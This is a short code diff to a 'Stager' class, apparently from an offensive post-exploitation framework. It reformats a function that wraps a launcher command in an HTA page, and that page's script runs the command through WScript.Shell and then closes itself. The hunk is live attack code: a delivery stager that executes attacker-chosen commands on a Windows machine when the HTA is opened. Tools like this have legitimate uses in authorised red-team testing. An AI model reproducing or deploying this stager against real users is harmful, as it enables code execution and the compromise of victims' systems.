@@ -137,9 +137,9 @@ class Stager:
         if launcher == "":
             log.error("[!] Error in launcher command generation.")
             return ""
-        else:
-            code = "<html><head><script>var c= '"
-            code += launcher.replace("'", "\\'") + "'\n"
-            code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
+
+        code = "<html><head><script>var c= '"
+        code += launcher.replace("'", "\\'") + "'\n"
+        code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
 
         return code
